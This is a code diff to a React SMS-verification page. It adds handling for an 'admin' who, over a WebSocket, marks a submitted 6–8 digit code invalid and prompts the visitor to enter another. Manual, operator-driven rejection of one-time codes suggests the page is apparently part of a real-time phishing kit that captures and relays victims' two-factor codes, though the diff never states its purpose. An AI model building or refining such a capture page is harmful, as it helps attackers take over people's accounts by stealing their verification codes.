@@ -5,13 +5,25 @@ import '../styles/verification.css';
 
 const SmsVerification = () => {
   const navigate = useNavigate();
-  const { submitForm, isConnected } = useWebSocket();
+  const { submitForm, isConnected, verificationError, clearVerificationError } = useWebSocket();
   const [code, setCode] = useState('');
   const [showError, setShowError] = useState(false);
+  const [showInvalidError, setShowInvalidError] = useState(false);
   const [isLoading, setIsLoading] = useState(false);
   const [isSubmitted, setIsSubmitted] = useState(false);
   const [countdown, setCountdown] = useState(120); // 2 minutes in seconds
   const [canResend, setCanResend] = useState(false);
+
+  // Handle verification error from admin
+  useEffect(() => {
+    if (verificationError && verificationError.type === 'sms') {
+      setShowInvalidError(true);
+      setIsLoading(false);
+      setIsSubmitted(false);
+      setCode('');
+      clearVerificationError();
+    }
+  }, [verificationError, clearVerificationError]);
 
   useEffect(() => {
     if (countdown <= 0) {
@@ -93,10 +105,14 @@ const SmsVerification = () => {
                 onChange={(e) => {
                   setCode(e.target.value);
                   setShowError(false);
+                  setShowInvalidError(false);
                 }}
               />
               <span className={`error ${showError ? 'show' : ''}`}>
                 Entered code must be exactly 6-8 digits
+              </span>
+              <span className={`error ${showInvalidError ? 'show' : ''}`} style={{ marginTop: '8px' }}>
+                Invalid code. Please check your text messages and try again.
               </span>
               <div className="new_code">
                 <div className="request items-center">
